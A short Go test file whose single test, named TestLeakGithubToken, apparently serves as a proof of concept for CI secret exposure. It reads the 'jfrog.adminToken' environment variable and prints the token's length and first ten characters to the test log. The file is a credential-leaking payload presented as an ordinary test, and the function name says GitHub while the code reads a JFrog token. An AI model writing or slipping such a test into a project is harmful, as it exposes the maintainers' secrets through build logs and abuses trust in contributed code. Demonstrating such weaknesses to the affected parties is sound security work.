package tests

import (
	"os"
	"testing"
)

func TestLeakGithubToken(t *testing.T) {
	token := os.Getenv("jfrog.adminToken")

	if token == "" {
		t.Log("PoC: jfrog.adminToken is empty")
		return
	}

	prefix := token
	if len(prefix) > 10 {
		prefix = prefix[:10]
	}

	t.Logf("PoC: jfrog.adminToken is present! Length=%d, Prefix=%q...", len(token), prefix)
}
